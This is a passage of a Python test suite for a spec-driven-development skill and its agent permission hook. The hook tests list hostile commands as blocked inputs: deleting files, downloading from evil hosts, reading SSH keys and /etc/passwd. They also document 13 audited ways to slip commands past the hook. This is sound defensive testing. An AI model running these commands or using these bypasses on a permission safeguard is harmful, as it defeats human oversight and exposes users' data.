    code, out = run('verify_acceptance.py', '--feature', 'demo', '--root', base)
    check('结论「通过」但有未达标 AC 时报错', code != 0 and '未通过' in out, out[-400:])

    base = os.path.join(tmp, 'a3')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'), '### [x] TASK-002:', '### TASK-002:')
    code, out = run('verify_acceptance.py', '--feature', 'demo', '--root', base)
    check('Task 未勾选却宣布通过时报错', code != 0 and '还没勾选' in out, out[-400:])

    base = os.path.join(tmp, 'a4')
    d = make_project(base)
    mutate(os.path.join(d, 'acceptance-report.md'),
           '| AC-E-001 | 缺字段返回 400 | TASK-003 | `test_ticket_api.py::test_missing` | ✅ 通过 |\n', '')
    code, out = run('verify_acceptance.py', '--feature', 'demo', '--root', base)
    check('回放矩阵漏掉一条 AC 时报错', code != 0 and '缺少' in out, out[-400:])

    base = os.path.join(tmp, 'a5')
    d = make_project(base)
    mutate(os.path.join(d, 'acceptance-report.md'),
           '| 列表接口 P95 | AC-P-001 | 小于 200ms | 143ms | ✅ |\n', '')
    code, out = run('verify_acceptance.py', '--feature', 'demo', '--root', base)
    check('性能实测缺一条指标时报错', code != 0 and '性能' in out, out[-400:])


def test_update_claude_md(tmp):
    print('\n=== update_claude_md.py ===')
    base = os.path.join(tmp, 'c1')
    d = make_project(base)
    code, out = run('update_claude_md.py', '--feature', 'demo', '--root', base)
    cm = os.path.join(base, 'CLAUDE.md')
    text = io.open(cm, encoding='utf-8').read()
    check('创建 SDD 区块', code == 0 and 'SDD:BEGIN' in text, out[-300:])
    check('区块列出三份规范路径', text.count('specs/demo/') == 3, text[:300])

    before = text
    run('update_claude_md.py', '--feature', 'demo', '--root', base)
    after = io.open(cm, encoding='utf-8').read()
    check('重复执行幂等', before == after)

    base = os.path.join(tmp, 'c2')
    make_project(base, 'demo')
    make_project(base, 'billing')
    io.open(os.path.join(base, 'CLAUDE.md'), 'w', encoding='utf-8', newline='\n').write(
        '# 我的项目\n\n原有内容,不能动。\n')
    run('update_claude_md.py', '--feature', 'billing', '--root', base)
    text = io.open(os.path.join(base, 'CLAUDE.md'), encoding='utf-8').read()
    check('多 feature 时新增的不会挤掉已有的',
          'specs/demo/' in text and 'specs/billing/' in text)
    check('不破坏用户原有内容', '原有内容,不能动' in text)


def test_export_openspec(tmp):
    print('\n=== export_openspec.py ===')
    base = os.path.join(tmp, 'e1')
    make_project(base, files=dict(FILES, **{'proposal.md': PROPOSAL % {'delta1': '<!-- ADDED -->'}}))
    code, out = run('export_openspec.py', '--feature', 'demo', '--root', base)
    change = os.path.join(base, 'openspec', 'changes', 'demo')
    check('导出 change 目录', code == 0 and os.path.isfile(os.path.join(change, 'proposal.md')), out[-300:])
    check('导出累积的 capability spec',
          os.path.isfile(os.path.join(base, 'openspec', 'specs', 'demo', 'spec.md')))
    spec = io.open(os.path.join(change, 'specs', 'demo', 'spec.md'), encoding='utf-8').read()
    check('delta 映射到 ADDED Requirements', '## ADDED Requirements' in spec)
    check('拆出 GIVEN/WHEN/THEN',
          '**GIVEN**' in spec and '**WHEN**' in spec and '**THEN**' in spec, spec[:400])
    tasks = io.open(os.path.join(change, 'tasks.md'), encoding='utf-8').read()
    check('tasks 转成复选框编号格式', '- [x] 1.1' in tasks, tasks[:300])
    check('tasks 保留验证命令', '验证命令' in tasks)


def test_init_specs(tmp):
    print('\n=== init_specs.py ===')
    base = os.path.join(tmp, 'i1')
    os.makedirs(base)
    code, out = run('init_specs.py', 'demo', '--root', base)
    d = os.path.join(base, 'specs', 'demo')
    check('生成三份骨架', code == 0 and all(
        os.path.isfile(os.path.join(d, n)) for n in ('proposal.md', 'design.md', 'tasks.md')))
    text = io.open(os.path.join(d, 'proposal.md'), encoding='utf-8').read()
    check('骨架预填了 feature 名与日期', 'demo' in text and '2026' in text)
    io.open(os.path.join(d, 'proposal.md'), 'w', encoding='utf-8').write('我改过的内容')
    run('init_specs.py', 'demo', '--root', base)
    check('不覆盖已有文件', io.open(os.path.join(d, 'proposal.md'), encoding='utf-8').read() == '我改过的内容')


def test_comment_handling(tmp):
    """文档的说明性注释里会写示例编号,四个脚本都不能把它当真实数据。"""
    print('\n=== 注释里的示例编号不被当成真实数据 ===')
    # 用真实的模板走一遍——模板的 §3 说明注释里就有 AC-F-NNN 示例
    base = os.path.join(tmp, 'c0')
    os.makedirs(base)
    run('init_specs.py', 'demo', '--root', base)
    d = os.path.join(base, 'specs', 'demo')

    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('validate 不把模板注释里的示例编号当成真 AC', '编号重复' not in out, out[-300:])

    code, out = run('update_claude_md.py', '--feature', 'demo', '--root', base)
    text = io.open(os.path.join(base, 'CLAUDE.md'), encoding='utf-8').read()
    # 模板 §3 里有 6 条真 AC(F×2 + P×2 + E×2),注释里的 AC-F-NNN 示例不算
    check('update_claude_md 的 AC 计数不含注释里的示例',
          'AC 6 条' in text, text[text.find('| 需求定义'):][:120])

    code, out = run('export_openspec.py', '--feature', 'demo', '--root', base)
    spec = io.open(os.path.join(base, 'openspec', 'changes', 'demo', 'specs', 'demo',
                                'spec.md'), encoding='utf-8').read()
    check('export 不把注释里的示例导出成 Requirement',
          'AC-F-NNN' not in spec and '## ADDED Requirements' not in spec, spec[:300])


def test_meta_section(tmp):
    print('\n=== §0 元信息 ===')
    base = os.path.join(tmp, 'm1')
    os.makedirs(base)
    run('init_specs.py', 'demo', '--root', base)
    d = os.path.join(base, 'specs', 'demo')
    for name in ('proposal.md', 'design.md', 'tasks.md'):
        text = io.open(os.path.join(d, name), encoding='utf-8').read()
        check('%s 有 §0 元信息章节(规范里多处引用 §0)' % name,
              '## 0. 元信息' in text)


def test_assumption_vs_open_question(tmp):
    print('\n=== 假设与开放问题分离 ===')
    base = os.path.join(tmp, 'q1')
    d = make_project(base)
    mutate(os.path.join(d, 'proposal.md'),
           '- **ASM-001**: 假设单班次 10 人以内',
           '- **ASM-001**: 假设单班次 10 人以内\n- **OQ-001**: 是否需要支持离线提交')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('proposal 里的 OQ 未被 design 承接时报错', code != 0 and 'OQ-001' in out, out[-300:])


def test_as_is_mode(tmp):
    """as-is(现状逆向)模式的规范:结构与规则都要能过校验。"""
    print('\n=== as-is(现状逆向)模式 ===')
    base = os.path.join(tmp, 's1')
    d = make_project(base, files=ASIS_FILES)
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('as-is 规范整体通过校验', code == 0, out[-600:])

    text = io.open(os.path.join(d, 'proposal.md'), encoding='utf-8').read()
    check('§1.2 同时有系统层与规范层目标',
          '**系统层**' in text and '**规范层**' in text)
    check('§1.3 分了「使用系统的人」与「读这份规范的人」两栏',
          '**使用系统的人**' in text and '**读这份规范的人**' in text)
    check('§2.2 显式写了不修改生产代码', '不修改任何生产代码' in text)
    check('§2.3 写了采信规则(以实现为准)', '采信规则' in text)
    check('AC 写「默认 X + 覆盖方式」而非字面值',
          '默认 0.05' in text and '覆盖' in text)

    dtext = io.open(os.path.join(d, 'design.md'), encoding='utf-8').read()
    # 只数「行首就是模块名」的表格行——依赖列里也会出现别的模块名
    def mod_rows(name):
        return len(re.findall(r'^\| `%s` \|' % re.escape(name), dtext, re.M))
    check('项目级规范:模块分区都落在 §1.1(三个分区)',
          mod_rows('query-pipeline') == 1
          and mod_rows('retrieval') == 1
          and mod_rows('synthesis') == 1,
          'query-pipeline=%d retrieval=%d synthesis=%d'
          % (mod_rows('query-pipeline'), mod_rows('retrieval'), mod_rows('synthesis')))
    check('ADR 全局编号不重启(首个是 ADR-003)', '### ADR-003:' in dtext)
    check('ADR 有「对应 AC」字段', '对应 AC' in dtext)

    # ADR 编号倒退
    base = os.path.join(tmp, 's2')
    d = make_project(base, files=ASIS_FILES)
    mutate(os.path.join(d, 'design.md'),
           '### ADR-004: 引用编号采用一份清单同一顺序',
           '### ADR-006: 引用编号采用一份清单同一顺序')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('ADR 编号倒退时报错', code != 0 and '递增' in out, out[-400:])

    # 「对应 AC」指向不存在的 AC
    base = os.path.join(tmp, 's3')
    d = make_project(base, files=ASIS_FILES)
    mutate(os.path.join(d, 'design.md'),
           '- **对应 AC**: AC-F-001', '- **对应 AC**: AC-F-999')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('ADR 的「对应 AC」指向不存在的 AC 时报错',
          code != 0 and 'AC-F-999' in out, out[-400:])

    # 性能 AC 只写「默认 X + 覆盖」没有比较符,不应被判为未量化
    base = os.path.join(tmp, 's4')
    d = make_project(base, files=ASIS_FILES)
    mutate(os.path.join(d, 'proposal.md'),
           '- **AC-P-002**: 给定探针重排分,系统 SHALL 进入真实检索路径,'
           '门限为当前生效的相关度门限（默认 0.05,可用 RAG_MIN_TOP_RELEVANCE_SCORE 覆盖）',
           '- **AC-P-002**: 给定探针重排分,系统 SHALL 进入真实检索路径,门限足够低')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('性能 AC 未给量化阈值时报错', code != 0 and '量化' in out, out[-400:])


def test_hook_and_installer(tmp):
    """PreToolUse hook 的放行判定 + 安装器的幂等性。"""
    print('\n=== sdd_bash_allow.py / install_hook.py ===')
    sys.path.insert(0, os.path.join(SKILL, 'hooks'))
    try:
        import sdd_bash_allow as hook
    except Exception as exc:  # pragma: no cover
        check('hook 模块可导入', False, repr(exc))
        return

    def hit(cmd):
        return hook.evaluate(cmd) is not None

    # --- 放行 SDD 自己的脚本 ---
    check('放行 skills/sdd/scripts 下的脚本',
          hit('python "C:/Users/ghy/.claude/skills/sdd/scripts/validate_specs.py" --feature x'))
    check('放行相对路径的 SDD 脚本',
          hit('python skills/sdd/scripts/init_specs.py --help'))
    check('放行项目内 .claude/sdd 下的脚本',
          hit('python .claude/sdd/validate.py demo'))
    check('放行带 -X 选项的 SDD 脚本',
          hit('python -X utf8 skills/sdd/scripts/validate_specs.py --feature x'))

    # --- 不放行任意 python ---
    check('不放行 python -c 内联代码', not hit('python -c "print(1)"'))
    check('不放行 python -m 任意模块', not hit('python -m evil_module'))
    check('不放行 SDD 目录之外的 python 脚本',
          not hit('python scripts/evil.py'))
    check('不放行路径穿越到 SDD 目录之外',
          not hit('python skills/sdd/scripts/../../evil.py'))

    # --- 复合操作符一律不放行 ---
    check('不放行 `python 脚本 && rm -rf`',
          not hit('python skills/sdd/scripts/x.py && rm -rf /'))
    check('不放行 `python 脚本; curl`',
          not hit('python skills/sdd/scripts/x.py; curl http://evil'))
    check('不放行 `python 脚本 | sh`',
          not hit('python skills/sdd/scripts/x.py | sh'))
    check('不放行命令替换',
          not hit('python skills/sdd/scripts/x.py $(rm -rf /)'))

    # --- 引号内的元字符不算复合操作 ---
    check('放行 commit message 里带 > 的 git 命令',
          hit('git commit -m "fix -> bug"'))
    check('放行前导 cd 的形式',
          hit('cd "D:/prep for work/Projects/X" && '
              'python skills/sdd/scripts/validate_specs.py'))

    # --- 复合命令:按段判定,全过才整体放行 ---
    check('放行 cd && pytest 的链式形式',
          hit('cd "D:/prep for work/Projects/X" && pytest tests/test_x.py'))
    check('放行 sleep && cd && pytest',
          hit('sleep 5 && cd "D:/x" && pytest tests/test_x.py'))
    check('放行只读命令的管道',
          hit('cat README.md | head -20'))
    check('放行 2>&1 的 fd 复制',
          hit('pytest tests/test_x.py 2>&1'))
    check('放行 git 的链式形式',
          hit('git status && git diff'))
    check('不放行链式里的危险段',
          not hit('pytest tests/test_x.py && rm -rf /'))
    check('不放行重定向',
          not hit('python skills/sdd/scripts/x.py > out.txt'))
    check('不放行后台运行',
          not hit('python skills/sdd/scripts/x.py &'))
    check('不放行链式里的命令替换',
          not hit('pytest $(whoami)'))
    check('不放行链式里的命令替换(在 cd 参数里)',
          not hit('cd $(pwd) && pytest'))

    # --- 只读命令:链式形态下路径必须在项目内 ---
    check('放行只读命令(单跑)', hit('ls') and hit('cat README.md'))
    check('不放行读取项目外的家目录文件',
          not hit('cat ~/.ssh/id_rsa'))
    check('不放行读取项目外的绝对路径',
          not hit('cat /etc/passwd'))
    check('不放行用相对路径穿到项目外',
          not hit('cat ../../etc/passwd'))
    # cd 之后的当前目录要参与路径判定:否则 `cd ~/.ssh && cat id_rsa` 会漏掉
    outside_dir = os.path.join(tmp, 'outside-read')
    os.makedirs(outside_dir, exist_ok=True)
    with io.open(os.path.join(outside_dir, 'secret.txt'), 'w', encoding='utf-8') as fh:
        fh.write('x')
    check('不放行 cd 到项目外再读文件',
          not hit('cd "%s" && cat secret.txt' % outside_dir))
    check('放行 cd 到项目内再读文件',
          hit('cd "%s" && cat run_tests.py' % os.path.join(os.getcwd(), 'tests')))

    # --- git ---
    check('放行 git status', hit('git status'))
    check('放行 git -C <路径> status', hit('git -C "D:/x" status'))
    check('放行 git commit', hit('git commit -m "msg"'))
    check('不放行 git push', not hit('git push origin main'))
    check('不放行 git reset --hard', not hit('git reset --hard'))
    check('不放行 git clean', not hit('git clean -fd'))
    # git 的前置选项能改行为,一律不放行:
    # -c 能定义 alias 把"安全子命令"换成任意 shell;--exec-path 能换掉子命令查找路径
    check('不放行 git -c alias 绕过',
          not hit('git -c "alias.status=!rm -rf /" status'))
    check('不放行 git --exec-path 换子命令查找路径',
          not hit('git --exec-path=/evil status'))
    check('不放行 git --git-dir 指向别的仓库',
          not hit('git --git-dir=/other/repo status'))

    # --- 危险可执行文件:即使用户写进白名单也不放行 ---
    check('白名单里有 rm 也不放行 rm',
          hook.evaluate('rm -rf /', extra=['rm -rf /']) is None)
    check('白名单里有 curl 也不放行 curl',
          hook.evaluate('curl http://evil.example/x.sh', extra=['curl']) is None)
    check('白名单里有 rm 也不放行 rm -rf /data',
          hook.evaluate('rm -rf /data', extra=['rm -rf /']) is None)

    # --- 太松的白名单模式等于开后门 ---
    check('松散模式 python 放不了 python -c',
          hook.match_extra('python -c "x"', ['python', '-c', 'x'], ['python']) is None)
    check('松散模式 python -m 放不了任意模块',
          hook.match_extra('python -m evil', ['python', '-m', 'evil'],
                           ['python -m']) is None)
    check('钉死模块的 python -m pytest 照常放行',
          hook.match_extra('python -m pytest', ['python', '-m', 'pytest'],
                           ['python -m pytest']) is not None)

    # --- 默认额外白名单 ---
    check('放行 pytest', hit('pytest tests/test_x.py'))
    check('放行 npm test', hit('npm test'))
    check('放行 python -m pytest(内置测试命令)', hit('python -m pytest'))
    check('不放行名字相近的其他命令', not hit('pytestx tests/test_x.py'))

    # 直接盯住 load_allowlist 的返回值 —— 内置默认项曾经因为元组解包写反
    # (extra, tools = [], list(DEFAULT_EXTRA))被塞进 tools,导致内置白名单全部失效
    loaded_extra, loaded_tools, loaded_write_paths = hook.load_allowlist()
    check('内置默认白名单在 extra 里', 'pytest' in loaded_extra, repr(loaded_extra[:5]))
    check('内置默认白名单没混进 tools', 'pytest' not in loaded_tools, repr(loaded_tools[:5]))
    check('文件白名单与内置默认项合并', len(loaded_extra) >= len(hook.DEFAULT_EXTRA),
          '%d < %d' % (len(loaded_extra), len(hook.DEFAULT_EXTRA)))
    check('write_paths 单独返回,不混进 tools', isinstance(loaded_write_paths, list),
          repr(loaded_write_paths[:5]))

    # --- 空输入不炸 ---
    check('空命令不放行', not hit(''))
    check('None 不炸', hook.evaluate(None) is None)

    # --- 写文件工具:只看路径 ---
    root = os.path.join(tmp, 'write-root')
    os.makedirs(os.path.join(root, 'src'), exist_ok=True)
    os.makedirs(os.path.join(root, '.claude'), exist_ok=True)
    os.makedirs(os.path.join(root, '.git'), exist_ok=True)

    def can_write(tool, path, root_dir=None, write_paths=None):
        return hook.evaluate_tool(tool, {'file_path': path}, root=root_dir or root,
                                  write_paths=write_paths) is not None

    check('放行项目目录内的 Write', can_write('Write', os.path.join(root, 'src', 'a.py')))
    check('放行项目目录内的 Edit', can_write('Edit', os.path.join(root, 'src', 'b.py')))
    check('放行新建文件(文件还不存在)',
          can_write('Write', os.path.join(root, 'src', 'new', 'c.py')))
    check('不放行项目目录外的文件',
          not can_write('Write', os.path.join(tmp, 'outside.py')))
    check('不放行路径穿越到项目外',
          not can_write('Write', os.path.join(root, 'src', '..', '..', 'outside.py')))
    check('不放行项目内的 .claude/settings.json',
          not can_write('Write', os.path.join(root, '.claude', 'settings.json')))
    check('不放行项目内的 .git/config',
          not can_write('Edit', os.path.join(root, '.git', 'config')))
    check('缺 file_path 的 Write 不放行', not can_write('Write', ''))
    check('不认识的工具不放行', hook.evaluate_tool('Read', {'file_path': 'x'}, root=root) is None)
    check('write_paths 收紧后只放行指定子路径',
          can_write('Write', os.path.join(root, 'src', 'd.py'), write_paths=['src'])
          and not can_write('Write', os.path.join(root, 'other.py'), write_paths=['src']))
    check('write_paths 收紧后仍不放行 .claude',
          not can_write('Write', os.path.join(root, '.claude', 'settings.json'),
                        write_paths=['.']))
    check('推断不出项目根时不放行',
          hook.evaluate_tool('Write', {'file_path': 'x.py'}, root='') is None)
    check('放行派发子 agent(Agent)',
          hook.evaluate_tool('Agent', {'description': 'do it'}, root=root) is not None)
    check('放行派发子 agent(Task 旧名)',
          hook.evaluate_tool('Task', {'description': 'do it'}, root=root) is not None)
    check('write_paths 全是空串时 fail-closed(不放行)',
          not can_write('Write', os.path.join(root, 'src', 'x.py'),
                        write_paths=['', '   ']))
    check('tools 里写 Write 也不能绕过路径判定',
          hook.evaluate_tool('Write', {'file_path': os.path.join(root, '.claude', 'settings.json')},
                             tools=['Write'], root=root) is None)

    # --- 命令替换藏在 cd 参数里(剥掉 cd 前缀后会逃过检查)---
    check('不放行 cd 参数里的命令替换',
          not hit('cd $(whoami) && pytest'))
    check('不放行 cd 参数里的反引号',
          not hit('cd `whoami` && pytest'))
    check('不放行 cd 参数里的命令替换(无空格)',
          not hit('cd $(whoami)&&pytest'))

    # --- 危险包装器:只查 argv[0] 时白名单里写一条 sh -c 就开后门 ---
    for wrapper in ('sh', 'bash', 'cmd', 'powershell', 'pwsh', 'perl', 'ruby',
                    'node', 'npx', 'osascript', 'wscript', 'env', 'xargs'):
        check('不放行 %s(即使写进白名单)' % wrapper,
              hook.evaluate('%s -c "rm -rf /"' % wrapper,
                            extra=['%s -c "rm -rf /"' % wrapper]) is None)
    check('不放行 find -exec',
          hook.evaluate('find . -exec rm {} +', extra=['find']) is None)
    check('放行普通 find',
          hook.evaluate('find . -name "*.py"', extra=['find']) is not None)

    # --- 路径子串命中:任何目录里带 skills/sdd/scripts 都不算自家脚本 ---
    check('不放行子串路径伪装成 SDD 脚本',
          not hit('python /tmp/evil/skills/sdd/scripts/payload.py'))

    # ==================================================================
    # 对抗式审计确认的 13 个洞 —— 每条都要有回归断言
    # (2026-11-21,workflow wf_3c17249d-7c1;验证者在真实 harness 里
    #  实测过其中几条真的能执行 rm / 读项目外文件)
    # ==================================================================

    # ① 反斜杠转义的引号让拆段器状态与 bash 不一致 → 第二段从不被判定
    check('洞① 不放行 `true \\" && git push`',
          not hit(r'true \" && git push'))
    check('洞① 不放行 `true \\" && rm -rf /`',
          not hit(r'true \" && rm -rf /'))
    check('洞① 不放行 `true \\" && curl http://evil/x`',
          not hit(r'true \" && curl http://evil/x'))
    check('洞① 不放行 `true \\" && cat ~/.ssh/id_rsa`',
          not hit(r'true \" && cat ~/.ssh/id_rsa'))
    check('洞① 不放行 `echo \\"&& rm -rf /\\"`',
          not hit(r'echo \"&& rm -rf /\"'))
    check('洞① 成对引号仍然放行(别把正常的引号也毙了)',
          hit('echo "hello world"'))

    # ② `>&file` 是「重定向到文件」,不是 fd 复制 → 任意路径写原语
    check('洞② 不放行 `echo x 1>&/c/Users/ghy/.bashrc`',
          not hit('echo x 1>&/c/Users/ghy/.bashrc'))
    check('洞② `2>&1` 仍然是 fd 复制(要放行)',
          hit('pytest tests/test_x.py 2>&1'))

    # ③④⑥ 路径里的 $VAR 不展开 → 项目内的相对路径,实际读的是真密钥
    check('洞③ 不放行 `cat $HOME/.ssh/id_ed25519`',
          not hit('cat $HOME/.ssh/id_ed25519'))
    check('洞③ 不放行 `cat "$HOME/.ssh/id_ed25519"`',
          not hit('cat "$HOME/.ssh/id_ed25519"'))
    check('洞③ 不放行 `cd $HOME/.ssh && cat id_rsa`',
          not hit('cd $HOME/.ssh && cat id_rsa'))
    check('洞③ 不放行 `cat $USERPROFILE/.ssh/id_rsa`',
          not hit('cat $USERPROFILE/.ssh/id_rsa'))

    # ④ 通配符不展开 → 一个路径都没检查
    check('洞④ 不放行 `cd ~/.ssh && cat *`',
          not hit('cd ~/.ssh && cat *'))
    check('洞④ 不放行 `cd ~/.ssh && cat id*`',
          not hit('cd ~/.ssh && cat id*'))

    # ⑤ git 的写文件选项 / find 的写文件选项
    check('洞⑤ 不放行 `git diff --output=$HOME/evil.txt`',
          not hit('git diff --output=$HOME/evil.txt'))
    check('洞⑤ 不放行 `find . -fprintf $HOME/pwned.txt %p`',
          not hit('find . -fprintf $HOME/pwned.txt %p'))

    # ⑦ Git-Bash 风格绝对路径 /c/... → 换盘符后仍要判项目内外
    check('洞⑦ 不放行 `cd /c/Users/ghy/.ssh && cat id_ed25519`',
          not hit('cd /c/Users/ghy/.ssh && cat id_ed25519'))
    check('洞⑦ 不放行 `cd /c/Users/ghy/.aws && cat credentials`',
          not hit('cd /c/Users/ghy/.aws && cat credentials'))

    # ⑧⑨ 选项里的路径(--from-file= / --output=)不能整体跳过
    check('洞⑧ 不放行 `diff --from-file=$HOME/.ssh/id_ed25519 README.md`',
          not hit('diff --from-file=$HOME/.ssh/id_ed25519 README.md'))
    check('洞⑨ 不放行 `sort --output=.git/hooks/pre-commit README.md`',
          not hit('sort --output=.git/hooks/pre-commit README.md'))
    check('洞⑨ 不放行 `sort --output=.claude/x.txt README.md`',
          not hit('sort --output=.claude/x.txt README.md'))

    # ⑩ git -C 指向别的仓库 + 会写的子命令
    check('洞⑩ 不放行 `git -C <别的仓库> commit`',
          not hit('git -C "D:/prep for work/Projects/YuanRAG" commit -m x'))
    check('洞⑩ 只读子命令的 -C 仍然放行',
          hit('git -C "D:/x" status'))

    # ⑪ ls 也要判路径
    check('洞⑪ 不放行 `ls -l $HOME/.ssh`', not hit('ls -l $HOME/.ssh'))

    # ⑬ skills/sdd/scripts/ 只认固定文件名(那个目录 AI 自己就能写)
    check('洞⑬ 不放行 skills/sdd/scripts 下的任意脚本',
          not hit('python skills/sdd/scripts/_audit_payload_probe.py'))
    check('洞⑬ 固定文件名的技能脚本照常放行',
          hit('python skills/sdd/scripts/validate_specs.py --feature x'))

    # --- 技能脚本的可信判定(目录联接 realpath 越界的那次误伤)---
    home_skill = hook.logical_path(os.path.join(
        os.path.expanduser('~'), '.claude', 'skills', 'sdd', 'scripts',
        'install_hook.py'))
    check('~/.claude 下的技能脚本可信(联接不该被误伤)',
          hook.script_trusted(home_skill) is True, home_skill)
    check('项目里的陌生 skills/sdd/scripts 不可信',
          hook.script_trusted(hook.logical_path(
              os.path.join(tmp, 'skills', 'sdd', 'scripts', 'x.py'))) is False)
    check('空路径不可信', hook.script_trusted('') is False)

    # --- 只读命令的边界:sed / 透明包装器 ---
    check('放行只读的 sed', hit('sed -n "1,10p" README.md'))
    check('不放行 sed -i(会就地改文件)',
          not hit('sed -i "s/a/b/" README.md'))
    # 模式类选项后面的参数是表达式,不是路径(Python 3.13 起 '/x' 算绝对路径)
    check('放行 sed 的地址表达式(以 / 开头)',
          hit("sed -n '/### 2.2/,/### 2.3/p' README.md"))
    check('不放行 项目外的绝对路径读取', not hit('cat /etc/passwd'))
    check('放行 time 包着的白名单命令',
          hit('time python -m pytest tests/test_x.py'))
    check('不放行 time 包着的危险命令', not hit('time rm -rf /'))
    check('放行 timeout 300 包着的白名单命令',
          hit('timeout 300 python -m pytest tests/test_x.py'))
    check('放行 python --version', hit('python --version'))
    check('放行读自己的会话日志(工作流 journal)',
          hook.evaluate('tail -4 "%s"' % os.path.join(
              hook.session_transcript_dir(), 'subagents', 'workflows',
              'wf_x', 'journal.jsonl')) is not None)
    check('不放行读别的项目的会话日志',
          hook.evaluate('tail -4 "C:/Users/ghy/.claude/projects/other-proj/x.jsonl"')
          is None)

    # --- hook_probe.py:让用户能直接问「这条命令会不会被放行」---
    code, out = run('hook_probe.py', 'git status')
    try:
        probe = json.loads(out.strip())
    except Exception:
        probe = {}
    check('hook_probe 对放行命令给出理由',
          code == 0 and probe.get('allowed') is True and probe.get('reason'),
          out[-300:])
    code, out = run('hook_probe.py', 'git status && rm -rf /')
    try:
        probe = json.loads(out.strip())
    except Exception:
        probe = {}
    check('hook_probe 对危险链式命令说不放行',
          code == 0 and probe.get('allowed') is False, out[-300:])
    code, out = run('hook_probe.py', '--list')
    try:
        probe = json.loads(out.strip())
    except Exception:
        probe = {}
    check('hook_probe --list 打出当前白名单',
          code == 0 and 'pytest' in (probe.get('extra') or []), out[-300:])

    # --- hook 的 stdout 形状(改坏 emit_allow 时测试必须能发现)---
    repo_root = os.path.dirname(os.path.dirname(SKILL))
    sdd_script = os.path.join(repo_root, 'skills', 'sdd', 'scripts', 'init_specs.py')
    allow_out, allow_err = run_hook({'tool_name': 'Bash',
                                     'tool_input': {'command': 'python "%s" --help' % sdd_script}})
    check('放行时 stdout 以 { 开头',
          allow_out.startswith(b'{'), repr(allow_out[:120]))
    check('放行时 stdout 是纯 ASCII(Windows 上 GBK 会让 harness 读成乱码)',
          allow_out.isascii(), repr(allow_out[:120]))
    try:
        parsed = json.loads(allow_out.decode('ascii'))
        decision = parsed.get('hookSpecificOutput', {}).get('permissionDecision')
        check('放行时 permissionDecision 是 allow', decision == 'allow', repr(decision))
        check('放行时带 hookEventName',
              parsed.get('hookSpecificOutput', {}).get('hookEventName') == 'PreToolUse',
              repr(parsed)[:200])
    except Exception as exc:
        check('放行时 stdout 能被 json.loads 解析', False, repr(exc))
    check('放行时 stderr 为空', allow_err.strip() == '', allow_err[:200])

    deny_out, deny_err = run_hook({'tool_name': 'Bash',
                                   'tool_input': {'command': 'python -c "print(1)"'}})
    check('未命中时 stdout 完全为空(不能有半截 JSON)',
          deny_out == b'', repr(deny_out[:120]))
    check('未命中时 stderr 为空', deny_err.strip() == '', deny_err[:200])

    # --- 写文件的放行也要进审计日志 ---
    audit_dir = os.path.join(tmp, 'hook-audit')
    os.makedirs(audit_dir, exist_ok=True)
    hook_copy = os.path.join(audit_dir, 'sdd_bash_allow.py')
    shutil.copyfile(os.path.join(SKILL, 'hooks', 'sdd_bash_allow.py'), hook_copy)
    run_hook({'tool_name': 'Write',
              'tool_input': {'file_path': os.path.join(audit_dir, 'x.txt')}},
             hook_path=hook_copy,
             env={'SDD_HOOK_LOG': '1', 'CLAUDE_PROJECT_DIR': audit_dir})
    check('写文件放行也进审计日志',
          os.path.isfile(os.path.join(audit_dir, 'sdd-hook-audit.log')))

    # --- 安装器 ---
    base = os.path.join(tmp, 'hook-install')
    os.makedirs(os.path.join(base, 'specs', 'demo'), exist_ok=True)
    with io.open(os.path.join(base, 'specs', 'demo', 'tasks.md'), 'w',
                 encoding='utf-8', newline='\n') as fh:
        fh.write('# 任务\n\n### TASK-001: 实现登录\n\n'
                 '- **验证命令**: `pytest tests/test_login.py`\n')
    # 已有的 settings.json 不能被破坏
    settings_path = os.path.join(base, '.claude', 'settings.json')
    os.makedirs(os.path.dirname(settings_path), exist_ok=True)
    with io.open(settings_path, 'w', encoding='utf-8', newline='\n') as fh:
        fh.write('{"permissions": {"allow": ["Bash(git:*)"]}, "model": "opus"}\n')

    code, out = run('install_hook.py', '--root', base, '--feature', 'demo')
    check('安装器执行成功', code == 0, out[-400:])
    check('装出了 hook 文件',
          os.path.isfile(os.path.join(base, '.claude', 'hooks', 'sdd_bash_allow.py')))
    check('装出了白名单文件',
          os.path.isfile(os.path.join(base, '.claude', 'hooks', 'sdd-hook-allow.json')))

    with io.open(settings_path, encoding='utf-8') as fh:
        settings = json.load(fh)
    check('settings.json 保留了原有 permissions',
          settings.get('permissions', {}).get('allow') == ['Bash(git:*)'])
    check('settings.json 保留了其他键', settings.get('model') == 'opus')
    pre = settings.get('hooks', {}).get('PreToolUse', [])
    check('注册了 PreToolUse 条目',
          any('sdd_bash_allow.py' in str(h.get('command', ''))
              for e in pre for h in (e.get('hooks') or [])), json.dumps(pre)[:300])

    with io.open(os.path.join(base, '.claude', 'hooks', 'sdd-hook-allow.json'),
                 encoding='utf-8') as fh:
        allowlist = json.load(fh)
    check('验证命令被写进白名单',
          'pytest tests/test_login.py' in allowlist.get('extra', []),
          json.dumps(allowlist, ensure_ascii=False)[:300])
    check('白名单文件里有 write_paths 键', 'write_paths' in allowlist,
          json.dumps(allowlist, ensure_ascii=False)[:300])

    # 幂等:再跑一次不应产生重复条目
    code, out = run('install_hook.py', '--root', base, '--feature', 'demo')
    with io.open(settings_path, encoding='utf-8') as fh:
        settings2 = json.load(fh)
    pre2 = settings2.get('hooks', {}).get('PreToolUse', [])
    ours = [e for e in pre2
            if any('sdd_bash_allow.py' in str(h.get('command', ''))
                   for h in (e.get('hooks') or []))]
    check('重复安装不产生重复条目', len(ours) == 3, json.dumps(pre2)[:300])
    check('注册了 Bash、写文件与派发三组 matcher',
          sorted(str(e.get('matcher')) for e in ours) ==
          ['Agent|Task', 'Bash', 'Write|Edit|MultiEdit|NotebookEdit'],
          json.dumps([e.get('matcher') for e in ours]))
    with io.open(os.path.join(base, '.claude', 'hooks', 'sdd-hook-allow.json'),
                 encoding='utf-8') as fh:
        allowlist2 = json.load(fh)
    check('重复安装白名单不重复累加',
          allowlist2.get('extra', []).count('pytest tests/test_login.py') == 1,
          json.dumps(allowlist2, ensure_ascii=False)[:300])

    # dry-run 不落盘
    base2 = os.path.join(tmp, 'hook-dry')
    os.makedirs(base2, exist_ok=True)
